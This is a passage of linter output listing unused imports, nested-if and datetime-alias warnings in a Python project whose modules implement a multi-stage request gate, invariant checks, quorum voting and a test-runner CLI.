   --> src\psia\gate\invariant_head.py:140:9
    |
138 |                   )
139 |
140 | /         if inv.invariant_id == "inv_root_004":
141 | |             # INV-ROOT-4: Immutable write-path
142 | |             if action in self._MUTATION_ACTIONS:
    | |________________________________________________^
143 |                   # This invariant is structural ΓÇö it's enforced by the
144 |                   # Waterfall pipeline itself.  Pass here means the
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\psia\gate\invariant_head.py:148:9
    |
146 |                   pass  # Always passes at evaluation time
147 |
148 | /         if inv.invariant_id == "inv_root_005":
149 | |             # INV-ROOT-5: No self-modification of Cerberus
150 | |             if "cerberus" in resource.lower() or "gate" in resource.lower():
151 | |                 if action in self._MUTATION_ACTIONS:
    | |____________________________________________________^
152 |                       return False, (
153 |                           f"{inv.invariant_id}: attempt to modify Cerberus/Gate "
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\psia\gate\invariant_head.py:150:13
    |
148 |           if inv.invariant_id == "inv_root_005":
149 |               # INV-ROOT-5: No self-modification of Cerberus
150 | /             if "cerberus" in resource.lower() or "gate" in resource.lower():
151 | |                 if action in self._MUTATION_ACTIONS:
    | |____________________________________________________^
152 |                       return False, (
153 |                           f"{inv.invariant_id}: attempt to modify Cerberus/Gate "
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\psia\gate\invariant_head.py:157:9
    |
155 |                       )
156 |
157 | /         if inv.invariant_id == "inv_root_009":
158 | |             # INV-ROOT-9: Append-only ledger
159 | |             if "ledger" in resource.lower() and action in ("delete", "update", "patch"):
    | |________________________________________________________________________________________^
160 |                   return False, (
161 |                       f"{inv.invariant_id}: attempt to {action} ledger ΓÇö "
    |
help: Combine `if` statements using `and`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\gate\invariant_head.py:257:36
    |
255 |             reasons=reasons,
256 |             constraints_applied=constraints,
257 |             timestamp=datetime.now(timezone.utc).isoformat(),
    |                                    ^^^^^^^^^^^^
258 |             signature=Signature(
259 |                 alg="ed25519",
    |
help: Convert to `datetime.UTC` alias

F401 [*] `dataclasses.field` imported but unused
  --> src\psia\gate\quorum_engine.py:34:36
   |
33 | import logging
34 | from dataclasses import dataclass, field
   |                                    ^^^^^
35 | from datetime import datetime, timezone
36 | from enum import Enum
   |
help: Remove unused import: `dataclasses.field`

F401 [*] `psia.schemas.cerberus_decision.ConstraintsApplied` imported but unused
  --> src\psia\gate\quorum_engine.py:43:5
   |
41 |     CerberusVote,
42 |     CommitPolicy,
43 |     ConstraintsApplied,
   |     ^^^^^^^^^^^^^^^^^^
44 |     QuorumInfo,
45 | )
   |
help: Remove unused import: `psia.schemas.cerberus_decision.ConstraintsApplied`

UP042 Class DeploymentProfile inherits from both `str` and `enum.Enum`
  --> src\psia\gate\quorum_engine.py:51:7
   |
51 | class DeploymentProfile(str, Enum):
   |       ^^^^^^^^^^^^^^^^^
52 |     """Deployment profile for the quorum engine.
   |
help: Inherit from `enum.StrEnum`

F841 Local variable `merged_time_window` is assigned to but never used
   --> src\psia\gate\quorum_engine.py:236:9
    |
234 |         # ΓöÇΓöÇ Step 5: Merge constraints from all votes ΓöÇΓöÇ
235 |         merged_rate_limit = None
236 |         merged_time_window = None
    |         ^^^^^^^^^^^^^^^^^^
237 |         merged_require_shadow = None
238 |         for vote in votes:
    |
help: Remove assignment to unused variable `merged_time_window`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\psia\gate\quorum_engine.py:241:17
    |
239 |               ca = vote.constraints_applied
240 |               if ca:
241 | /                 if ca.rate_limit_per_min:
242 | |                     if (
243 | |                         merged_rate_limit is None
244 | |                         or ca.rate_limit_per_min < merged_rate_limit
245 | |                     ):
    | |______________________^
246 |                           merged_rate_limit = ca.rate_limit_per_min
247 |                   if ca.require_shadow:
    |
help: Combine `if` statements using `and`

F841 Local variable `merged_require_shadow` is assigned to but never used
   --> src\psia\gate\quorum_engine.py:248:21
    |
246 |                         merged_rate_limit = ca.rate_limit_per_min
247 |                 if ca.require_shadow:
248 |                     merged_require_shadow = True
    |                     ^^^^^^^^^^^^^^^^^^^^^
249 |
250 |         # ΓöÇΓöÇ Step 6: Construct commit policy ΓöÇΓöÇ
    |
help: Remove assignment to unused variable `merged_require_shadow`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\gate\quorum_engine.py:273:36
    |
271 |             ),
272 |             commit_policy=commit_policy,
273 |             timestamp=datetime.now(timezone.utc).isoformat(),
    |                                    ^^^^^^^^^^^^
274 |             signature_set=[
275 |                 Signature(alg="ed25519", kid=f"quorum_k{i}", sig=f"quorum_sig_{i}")
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\gate\quorum_engine.py:293:36
    |
291 |             ),
292 |             commit_policy=CommitPolicy(allowed=False),
293 |             timestamp=datetime.now(timezone.utc).isoformat(),
    |                                    ^^^^^^^^^^^^
294 |         )
    |
help: Convert to `datetime.UTC` alias

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> src\psia\liveness.py:56:1
   |
54 | from dataclasses import dataclass, field
55 | from enum import Enum
56 | from typing import Any, Callable
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
57 |
58 | logger = logging.getLogger(__name__)
   |
help: Import from `collections.abc`

UP042 Class HeadStatus inherits from both `str` and `enum.Enum`
  --> src\psia\liveness.py:61:7
   |
61 | class HeadStatus(str, Enum):
   |       ^^^^^^^^^^
62 |     """Health status of a Cerberus evaluation head."""
   |
help: Inherit from `enum.StrEnum`

UP042 Class LivenessViolation inherits from both `str` and `enum.Enum`
  --> src\psia\liveness.py:70:7
   |
70 | class LivenessViolation(str, Enum):
   |       ^^^^^^^^^^^^^^^^^
71 |     """Types of liveness violations."""
   |
help: Inherit from `enum.StrEnum`

F401 [*] `dataclasses.field` imported but unused
  --> src\psia\observability\autoimmune_dampener.py:33:36
   |
32 | import logging
33 | from dataclasses import dataclass, field
   |                                    ^^^^^
34 | from datetime import datetime, timezone
35 | from typing import Callable
   |
help: Remove unused import: `dataclasses.field`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> src\psia\observability\autoimmune_dampener.py:35:1
   |
33 | from dataclasses import dataclass, field
34 | from datetime import datetime, timezone
35 | from typing import Callable
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
36 |
37 | logger = logging.getLogger(__name__)
   |
help: Import from `collections.abc`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\observability\autoimmune_dampener.py:239:36
    |
237 |             new_sensitivity=new_sensitivity,
238 |             reason=f"FP rate {fp_rate:.3f} vs target {self.target_fp_rate:.3f}",
239 |             timestamp=datetime.now(timezone.utc).isoformat(),
    |                                    ^^^^^^^^^^^^
240 |         )
241 |         self._adjustments.append(adjustment)
    |
help: Convert to `datetime.UTC` alias

F401 [*] `dataclasses.field` imported but unused
  --> src\psia\observability\failure_detector.py:30:36
   |
28 | import time
29 | from collections import deque
30 | from dataclasses import dataclass, field
   |                                    ^^^^^
31 | from datetime import datetime, timezone
32 | from enum import Enum
   |
help: Remove unused import: `dataclasses.field`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> src\psia\observability\failure_detector.py:33:1
   |
31 | from datetime import datetime, timezone
32 | from enum import Enum
33 | from typing import Callable
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
34 |
35 | logger = logging.getLogger(__name__)
   |
help: Import from `collections.abc`

UP042 Class CircuitState inherits from both `str` and `enum.Enum`
  --> src\psia\observability\failure_detector.py:38:7
   |
38 | class CircuitState(str, Enum):
   |       ^^^^^^^^^^^^
39 |     """Circuit breaker state."""
   |
help: Inherit from `enum.StrEnum`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\observability\failure_detector.py:279:40
    |
277 |                 affected_components=open_circuits,
278 |                 correlation_score=len(open_circuits) / max(len(self._circuit_state), 1),
279 |                 timestamp=datetime.now(timezone.utc).isoformat(),
    |                                        ^^^^^^^^^^^^
280 |                 recommended_action=(
281 |                     "SAFE-HALT"
    |
help: Convert to `datetime.UTC` alias

F401 [*] `dataclasses.field` imported but unused
  --> src\psia\planes.py:20:36
   |
19 | import enum
20 | from dataclasses import dataclass, field
   |                                    ^^^^^
   |
help: Remove unused import: `dataclasses.field`

UP042 Class Plane inherits from both `str` and `enum.Enum`
  --> src\psia\planes.py:23:7
   |
23 | class Plane(str, enum.Enum):
   |       ^^^^^
24 |     """The six architectural planes of the PSIA."""
   |
help: Inherit from `enum.StrEnum`

UP042 Class PlaneCapability inherits from both `str` and `enum.Enum`
  --> src\psia\planes.py:34:7
   |
34 | class PlaneCapability(str, enum.Enum):
   |       ^^^^^^^^^^^^^^^
35 |     """Atomic capabilities that a plane may or may not exercise."""
   |
help: Inherit from `enum.StrEnum`

UP042 Class StorageMode inherits from both `str` and `enum.Enum`
  --> src\psia\planes.py:54:7
   |
54 | class StorageMode(str, enum.Enum):
   |       ^^^^^^^^^^^
55 |     """Storage access pattern for a plane."""
   |
help: Inherit from `enum.StrEnum`

UP042 Class NetworkAccess inherits from both `str` and `enum.Enum`
  --> src\psia\planes.py:63:7
   |
63 | class NetworkAccess(str, enum.Enum):
   |       ^^^^^^^^^^^^^
64 |     """Network access pattern for a plane."""
   |
help: Inherit from `enum.StrEnum`

F401 [*] `typing.Literal` imported but unused
  --> src\psia\schemas\capability.py:18:20
   |
16 | import hashlib
17 | import json
18 | from typing import Literal
   |                    ^^^^^^^
19 |
20 | from pydantic import BaseModel, Field
   |
help: Remove unused import: `typing.Literal`

UP042 Class InvariantScope inherits from both `str` and `enum.Enum`
  --> src\psia\schemas\invariant.py:25:7
   |
25 | class InvariantScope(str, enum.Enum):
   |       ^^^^^^^^^^^^^^
26 |     """Scope classification for invariants."""
   |
help: Inherit from `enum.StrEnum`

UP042 Class InvariantSeverity inherits from both `str` and `enum.Enum`
  --> src\psia\schemas\invariant.py:33:7
   |
33 | class InvariantSeverity(str, enum.Enum):
   |       ^^^^^^^^^^^^^^^^^
34 |     """Severity level of invariant violations."""
   |
help: Inherit from `enum.StrEnum`

UP042 Class InvariantEnforcement inherits from both `str` and `enum.Enum`
  --> src\psia\schemas\invariant.py:43:7
   |
43 | class InvariantEnforcement(str, enum.Enum):
   |       ^^^^^^^^^^^^^^^^^^^^
44 |     """Enforcement action when an invariant is violated."""
   |
help: Inherit from `enum.StrEnum`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\server\runtime.py:137:40
    |
136 |         self._booted = True
137 |         self._boot_time = datetime.now(timezone.utc).isoformat()
    |                                        ^^^^^^^^^^^^
138 |         boot_duration_ms = (time.monotonic() - start) * 1000
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\server\runtime.py:163:28
    |
161 |         """
162 |         self._intent_count += 1
163 |         now = datetime.now(timezone.utc)
    |                            ^^^^^^^^^^^^
164 |         request_id = f"req_{uuid.uuid4().hex[:12]}"
165 |         intent_hash = hashlib.sha256(
    |
help: Convert to `datetime.UTC` alias

F401 [*] `time` imported but unused
  --> src\psia\shadow\operational_semantics.py:51:8
   |
49 | import json
50 | import logging
51 | import time
   |        ^^^^
52 | from dataclasses import dataclass, field
53 | from enum import Enum
   |
help: Remove unused import: `time`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> src\psia\shadow\operational_semantics.py:54:1
   |
52 | from dataclasses import dataclass, field
53 | from enum import Enum
54 | from typing import Any, Callable
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
55 |
56 | logger = logging.getLogger(__name__)
   |
help: Import from `collections.abc`

UP042 Class DeterminismClass inherits from both `str` and `enum.Enum`
  --> src\psia\shadow\operational_semantics.py:59:7
   |
59 | class DeterminismClass(str, Enum):
   |       ^^^^^^^^^^^^^^^^
60 |     """Classification of programs by determinism guarantees.
   |
help: Inherit from `enum.StrEnum`

SIM108 Use ternary operator `prev_hash = self.steps[-1].state_hash if self.steps else "0" * 64` instead of `if`-`else`-block
   --> src\psia\shadow\operational_semantics.py:165:9
    |
163 |               separators=(",", ":"),
164 |           )
165 | /         if self.steps:
166 | |             prev_hash = self.steps[-1].state_hash
167 | |         else:
168 | |             prev_hash = "0" * 64
    | |________________________________^
169 |
170 |           state_hash = hashlib.sha256((prev_hash + step_data).encode()).hexdigest()
    |
help: Replace `if`-`else`-block with `prev_hash = self.steps[-1].state_hash if self.steps else "0" * 64`

F401 [*] `dataclasses.field` imported but unused
  --> src\psia\threat_model.py:62:36
   |
60 | import logging
61 | import time
62 | from dataclasses import dataclass, field
   |                                    ^^^^^
63 | from enum import Enum
64 | from typing import Any
   |
help: Remove unused import: `dataclasses.field`

UP042 Class ThreatClass inherits from both `str` and `enum.Enum`
  --> src\psia\threat_model.py:69:7
   |
69 | class ThreatClass(str, Enum):
   |       ^^^^^^^^^^^
70 |     """Classification of validator threats."""
   |
help: Inherit from `enum.StrEnum`

UP042 Class RiskLevel inherits from both `str` and `enum.Enum`
  --> src\psia\threat_model.py:79:7
   |
79 | class RiskLevel(str, Enum):
   |       ^^^^^^^^^
80 |     """Risk level assessment."""
   |
help: Inherit from `enum.StrEnum`

B007 Loop control variable `req_id` not used within loop body
   --> src\psia\threat_model.py:221:13
    |
219 |         total = 0
220 |         agreements = 0
221 |         for req_id, votes in requests.items():
    |             ^^^^^^
222 |             if head_a in votes and head_b in votes:
223 |                 total += 1
    |
help: Rename unused `req_id` to `_req_id`

UP042 Class StageDecision inherits from both `str` and `enum.Enum`
  --> src\psia\waterfall\engine.py:48:7
   |
48 | class StageDecision(str, enum.Enum):
   |       ^^^^^^^^^^^^^
49 |     """Decision at each stage boundary."""
   |
help: Inherit from `enum.StrEnum`

UP017 [*] Use `datetime.UTC` alias
  --> src\psia\waterfall\stage_0_structural.py:88:60
   |
86 |                 expires_at = datetime.fromisoformat(token_data["expires_at"])
87 |                 if expires_at.tzinfo is None:
88 |                     expires_at = expires_at.replace(tzinfo=timezone.utc)
   |                                                            ^^^^^^^^^^^^
89 |                 if expires_at < datetime.now(timezone.utc):
90 |                     reasons.append("capability_token expired")
   |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
  --> src\psia\waterfall\stage_0_structural.py:89:46
   |
87 |                 if expires_at.tzinfo is None:
88 |                     expires_at = expires_at.replace(tzinfo=timezone.utc)
89 |                 if expires_at < datetime.now(timezone.utc):
   |                                              ^^^^^^^^^^^^
90 |                     reasons.append("capability_token expired")
91 |             except (ValueError, TypeError):
   |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\waterfall\stage_0_structural.py:113:54
    |
111 |                 created = datetime.fromisoformat(envelope.timestamps.created_at)
112 |                 if created.tzinfo is None:
113 |                     created = created.replace(tzinfo=timezone.utc)
    |                                                      ^^^^^^^^^^^^
114 |                 # Reject requests from the far future (> 5 minutes clock skew)
115 |                 now = datetime.now(timezone.utc)
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\waterfall\stage_0_structural.py:115:36
    |
113 |                     created = created.replace(tzinfo=timezone.utc)
114 |                 # Reject requests from the far future (> 5 minutes clock skew)
115 |                 now = datetime.now(timezone.utc)
    |                                    ^^^^^^^^^^^^
116 |                 skew_seconds = (created - now).total_seconds()
117 |                 if skew_seconds > 300:
    |
help: Convert to `datetime.UTC` alias

F401 [*] `dataclasses.field` imported but unused
  --> src\psia\waterfall\stage_1_signature.py:18:36
   |
17 | import logging
18 | from dataclasses import dataclass, field
   |                                    ^^^^^
19 | from typing import Any
   |
help: Remove unused import: `dataclasses.field`

F401 [*] `typing.Any` imported but unused
  --> src\psia\waterfall\stage_1_signature.py:19:20
   |
17 | import logging
18 | from dataclasses import dataclass, field
19 | from typing import Any
   |                    ^^^
20 |
21 | from psia.waterfall.engine import StageDecision, StageResult, WaterfallStage
   |
help: Remove unused import: `typing.Any`

F401 [*] `typing.Any` imported but unused
  --> src\psia\waterfall\stage_3_shadow.py:22:20
   |
20 | import uuid
21 | from datetime import datetime, timezone
22 | from typing import Any, Protocol
   |                    ^^^
23 |
24 | from psia.schemas.identity import Signature
   |
help: Remove unused import: `typing.Any`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\waterfall\stage_3_shadow.py:108:36
    |
106 |                 ),
107 |             ),
108 |             timestamp=datetime.now(timezone.utc).isoformat(),
    |                                    ^^^^^^^^^^^^
109 |             signature=Signature(
110 |                 alg="ed25519", kid="shadow_k1", sig="shadow_passthrough_sig"
    |
help: Convert to `datetime.UTC` alias

F401 [*] `uuid` imported but unused
  --> src\psia\waterfall\stage_4_gate.py:16:8
   |
15 | import logging
16 | import uuid
   |        ^^^^
17 | from datetime import datetime, timezone
18 | from typing import Any, Literal, Protocol
   |
help: Remove unused import: `uuid`

UP017 [*] Use `datetime.UTC` alias
  --> src\psia\waterfall\stage_4_gate.py:62:36
   |
60 |             reasons=reasons,
61 |             constraints_applied=ConstraintsApplied(),
62 |             timestamp=datetime.now(timezone.utc).isoformat(),
   |                                    ^^^^^^^^^^^^
63 |             signature=Signature(
64 |                 alg="ed25519", kid="cerberus_id_k1", sig="stub_identity_sig"
   |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
  --> src\psia\waterfall\stage_4_gate.py:79:36
   |
77 |             reasons=[],
78 |             constraints_applied=ConstraintsApplied(),
79 |             timestamp=datetime.now(timezone.utc).isoformat(),
   |                                    ^^^^^^^^^^^^
80 |             signature=Signature(
81 |                 alg="ed25519", kid="cerberus_cap_k1", sig="stub_capability_sig"
   |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
  --> src\psia\waterfall\stage_4_gate.py:96:36
   |
94 |             reasons=[],
95 |             constraints_applied=ConstraintsApplied(),
96 |             timestamp=datetime.now(timezone.utc).isoformat(),
   |                                    ^^^^^^^^^^^^
97 |             signature=Signature(
98 |                 alg="ed25519", kid="cerberus_inv_k1", sig="stub_invariant_sig"
   |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\waterfall\stage_4_gate.py:175:36
    |
173 |                 requires_anchor_append=True,
174 |             ),
175 |             timestamp=datetime.now(timezone.utc).isoformat(),
    |                                    ^^^^^^^^^^^^
176 |             signature_set=[
177 |                 Signature(alg="ed25519", kid=f"quorum_k{i}", sig=f"quorum_sig_{i}")
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\waterfall\stage_4_gate.py:233:48
    |
231 |                         reasons=[DenyReason(code="HEAD_EXCEPTION", detail=str(exc))],
232 |                         constraints_applied=ConstraintsApplied(),
233 |                         timestamp=datetime.now(timezone.utc).isoformat(),
    |                                                ^^^^^^^^^^^^
234 |                         signature=Signature(
235 |                             alg="ed25519",
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\waterfall\stage_6_memory.py:180:28
    |
178 |         inputs_hash = hashlib.sha256(inputs_data.encode()).hexdigest()
179 |
180 |         now = datetime.now(timezone.utc).isoformat()
    |                            ^^^^^^^^^^^^
181 |
182 |         record = ExecutionRecord(
    |
help: Convert to `datetime.UTC` alias

F401 `cryptography.hazmat.primitives.hashes` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> src\security\audit_hardening.py:18:48
   |
16 | try:
17 |     from cryptography.hazmat.backends import default_backend
18 |     from cryptography.hazmat.primitives import hashes, serialization
   |                                                ^^^^^^
19 |     from cryptography.hazmat.primitives.asymmetric import ed25519
20 | except ImportError:
   |
help: Remove unused import: `cryptography.hazmat.primitives.hashes`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\security\control_plane_hardening.py:165:17
    |
164 |                   # Compare with known state
165 | /                 if resource in self.monitored_resources:
166 | |                     if self.monitored_resources[resource] != current_hash:
    | |__________________________________________________________________________^
167 |                           self._handle_tamper_detection(resource, current_hash)
    |
help: Combine `if` statements using `and`

F401 `cryptography.hazmat.primitives.hashes` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> src\security\key_management.py:17:48
   |
15 |     from cryptography.fernet import Fernet
16 |     from cryptography.hazmat.backends import default_backend
17 |     from cryptography.hazmat.primitives import hashes, serialization
   |                                                ^^^^^^
18 |     from cryptography.hazmat.primitives.asymmetric import rsa
19 | except ImportError:
   |
help: Remove unused import: `cryptography.hazmat.primitives.hashes`

SIM108 Use ternary operator `base = f"{self.qualifier.value}<{self.name}>" if self.qualifier else self.name` instead of `if`-`else`-block
  --> src\shadow_thirst\ast_nodes.py:75:9
   |
74 |       def __str__(self) -> str:
75 | /         if self.qualifier:
76 | |             base = f"{self.qualifier.value}<{self.name}>"
77 | |         else:
78 | |             base = self.name
   | |____________________________^
79 |
80 |           if self.type_params:
   |
help: Replace `if`-`else`-block with `base = f"{self.qualifier.value}<{self.name}>" if self.qualifier else self.name`

F401 [*] `dataclasses.field` imported but unused
  --> src\shadow_thirst\type_system.py:92:36
   |
91 | import logging
92 | from dataclasses import dataclass, field
   |                                    ^^^^^
93 | from enum import Enum
94 | from typing import Any
   |
help: Remove unused import: `dataclasses.field`

UP042 Class PlaneAnnotation inherits from both `str` and `enum.Enum`
   --> src\shadow_thirst\type_system.py:99:7
    |
 99 | class PlaneAnnotation(str, Enum):
    |       ^^^^^^^^^^^^^^^
100 |     """Plane annotation for types."""
    |
help: Inherit from `enum.StrEnum`

UP042 Class BaseType inherits from both `str` and `enum.Enum`
   --> src\shadow_thirst\type_system.py:108:7
    |
108 | class BaseType(str, Enum):
    |       ^^^^^^^^
109 |     """Base types in the Shadow Thirst type system."""
    |
help: Inherit from `enum.StrEnum`

SIM103 Return the condition directly
   --> src\shadow_thirst\type_system.py:165:9
    |
163 |               return True  # Dual is subtype of everything
164 |
165 | /         if (
166 | |             self.plane == PlaneAnnotation.INVARIANT
167 | |             and other.plane == PlaneAnnotation.SHADOW
168 | |         ):
169 | |             return True
170 | |
171 | |         return False
    | |____________________^
    |
help: Inline condition

UP045 [*] Use `X | None` for type annotations
  --> taar\cli.py:26:32
   |
26 | def _load_config(project_root: Optional[Path] = None):
   |                                ^^^^^^^^^^^^^^
27 |     """Load TAAR config with error handling."""
28 |     from taar.config import load_config
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> taar\cli.py:44:15
   |
42 |     ),
43 |     verbose: bool = typer.Option(False, "--verbose", "-v", help="Show detailed output"),
44 |     revision: Optional[str] = typer.Option(
   |               ^^^^^^^^^^^^^
45 |         None, "--since", help="Detect changes since revision"
46 |     ),
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> taar\cli.py:47:19
   |
45 |         None, "--since", help="Detect changes since revision"
46 |     ),
47 |     project_root: Optional[Path] = typer.Option(
   |                   ^^^^^^^^^^^^^^
48 |         None, "--root", help="Project root directory"
49 |     ),
   |
help: Convert to `X | None`

B008 Do not perform function call `typer.Option` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> taar\cli.py:47:36
   |
45 |           None, "--since", help="Detect changes since revision"
46 |       ),
47 |       project_root: Optional[Path] = typer.Option(
   |  ____________________________________^
48 | |         None, "--root", help="Project root directory"
49 | |     ),
   | |_____^
50 |   ) -> None:
51 |       """
   |

UP045 [*] Use `X | None` for type annotations
   --> taar\cli.py:115:19
    |
113 | def watch(
114 |     verbose: bool = typer.Option(False, "--verbose", "-v", help="Show detailed output"),
115 |     project_root: Optional[Path] = typer.Option(
    |                   ^^^^^^^^^^^^^^
116 |         None, "--root", help="Project root directory"
117 |     ),
    |
help: Convert to `X | None`

B008 Do not perform function call `typer.Option` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
   --> taar\cli.py:115:36
    |
113 |   def watch(
114 |       verbose: bool = typer.Option(False, "--verbose", "-v", help="Show detailed output"),
115 |       project_root: Optional[Path] = typer.Option(
    |  ____________________________________^
116 | |         None, "--root", help="Project root directory"
117 | |     ),
    | |_____^
118 |   ) -> None:
119 |       """
    |

UP045 [*] Use `X | None` for type annotations
   --> taar\cli.py:207:19
    |
205 | @app.command()
206 | def status(
207 |     project_root: Optional[Path] = typer.Option(
    |                   ^^^^^^^^^^^^^^
208 |         None, "--root", help="Project root directory"
209 |     ),
    |
help: Convert to `X | None`

B008 Do not perform function call `typer.Option` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
   --> taar\cli.py:207:36
    |
205 |   @app.command()
206 |   def status(
207 |       project_root: Optional[Path] = typer.Option(
    |  ____________________________________^
208 | |         None, "--root", help="Project root directory"
209 | |     ),
    | |_____^
210 |   ) -> None:
211 |       """Show TAAR cache statistics and last run info."""
    |

UP045 [*] Use `X | None` for type annotations
   --> taar\cli.py:229:19
    |
227 | @app.command()
228 | def clean(
229 |     project_root: Optional[Path] = typer.Option(
    |                   ^^^^^^^^^^^^^^
230 |         None, "--root", help="Project root directory"
231 |     ),
    |
help: Convert to `X | None`

B008 Do not perform function call `typer.Option` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
   --> taar\cli.py:229:36
    |
227 |   @app.command()
228 |   def clean(
229 |       project_root: Optional[Path] = typer.Option(
    |  ____________________________________^
230 | |         None, "--root", help="Project root directory"
231 | |     ),
    | |_____^
232 |   ) -> None:
233 |       """Clear the TAAR result cache."""
    |

UP045 [*] Use `X | None` for type annotations
   --> taar\cli.py:246:19
    |
244 | @app.command()
245 | def graph(
246 |     project_root: Optional[Path] = typer.Option(
    |                   ^^^^^^^^^^^^^^
247 |         None, "--root", help="Project root directory"
248 |     ),
    |
help: Convert to `X | None`

B008 Do not perform function call `typer.Option` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
   --> taar\cli.py:246:36
    |
244 |   @app.command()
245 |   def graph(
246 |       project_root: Optional[Path] = typer.Option(
    |  ____________________________________^
247 | |         None, "--root", help="Project root directory"
248 | |     ),
    | |_____^
249 |   ) -> None:
250 |       """Show the dependency graph and runner configuration."""
    |

UP045 [*] Use `X | None` for type annotations
   --> taar\cli.py:279:19
    |
277 |     ),
278 |     verbose: bool = typer.Option(False, "--verbose", "-v", help="Show detailed output"),
279 |     project_root: Optional[Path] = typer.Option(
    |                   ^^^^^^^^^^^^^^
280 |         None, "--root", help="Project root directory"
281 |     ),
    |
help: Convert to `X | None`

B008 Do not perform function call `typer.Option` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
   --> taar\cli.py:279:36
    |
277 |       ),
278 |       verbose: bool = typer.Option(False, "--verbose", "-v", help="Show detailed output"),
279 |       project_root: Optional[Path] = typer.Option(
    |  ____________________________________^
280 | |         None, "--root", help="Project root directory"
281 | |     ),
    | |_____^
282 |   ) -> None:
283 |       """
    |

F401 [*] `dataclasses.field` imported but unused
  --> taar\config.py:12:36
   |
10 | import os
11 | import tomllib
12 | from dataclasses import dataclass, field
   |                                    ^^^^^
13 | from pathlib import Path
14 | from typing import Any
   |
help: Remove unused import: `dataclasses.field`

UP041 [*] Replace aliased errors with `TimeoutError`
   --> taar\executor.py:221:16
    |
219 |                 "duration": duration,
220 |             }
221 |         except asyncio.TimeoutError:
    |                ^^^^^^^^^^^^^^^^^^^^
222 |             duration = time.perf_counter() - start
223 |             return {
    |
help: Replace `asyncio.TimeoutError` with builtin `TimeoutError`

SIM201 Use `changed_file.suffix != ".py"` instead of `not changed_file.suffix == ".py"`
   --> taar\graph.py:139:8
    |
137 |     Only returns files that actually exist.
138 |     """
139 |     if not changed_file.suffix == ".py":
    |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
140 |         return []
    |
help: Replace with `!=` operator

F401 [*] `time` imported but unused
  --> taar\watcher.py:12:8
   |
11 | import threading
12 | import time
   |        ^^^^
13 | from pathlib import Path
14 | from typing import Callable
   |
help: Remove unused import: `time`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> taar\watcher.py:14:1
   |
12 | import time
13 | from pathlib import Path
14 | from typing import Callable
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
15 |
16 | # Try to use watchdog, fall back to polling
   |
help: Import from `collections.abc`

F401 `watchdog.events.FileCreatedEvent` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> taar\watcher.py:19:9
   |
17 | try:
18 |     from watchdog.events import (
19 |         FileCreatedEvent,
   |         ^^^^^^^^^^^^^^^^
20 |         FileModifiedEvent,
21 |         FileSystemEventHandler,
   |
help: Remove unused import

F401 `watchdog.events.FileModifiedEvent` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> taar\watcher.py:20:9
   |
18 |     from watchdog.events import (
19 |         FileCreatedEvent,
20 |         FileModifiedEvent,
   |         ^^^^^^^^^^^^^^^^^
21 |         FileSystemEventHandler,
22 |     )
   |
help: Remove unused import

E402 Module level import not at top of file
  --> tarl\__init__.py:14:1
   |
12 | # Import TarlRuntime from the runtime.py file (not runtime/ directory)
13 | # We do this by importing the module explicitly
14 | import importlib.util
   | ^^^^^^^^^^^^^^^^^^^^^
15 |
16 | from tarl.policy import TarlPolicy
   |

E402 Module level import not at top of file
  --> tarl\__init__.py:16:1
   |
14 | import importlib.util
15 |
16 | from tarl.policy import TarlPolicy
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
17 | from tarl.spec import TarlDecision, TarlVerdict
   |

E402 Module level import not at top of file
  --> tarl\__init__.py:17:1
   |
16 | from tarl.policy import TarlPolicy
17 | from tarl.spec import TarlDecision, TarlVerdict
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | _runtime_file = _tarl_dir / "runtime.py"
   |

E402 Module level import not at top of file
  --> tarl\__init__.py:26:1
   |
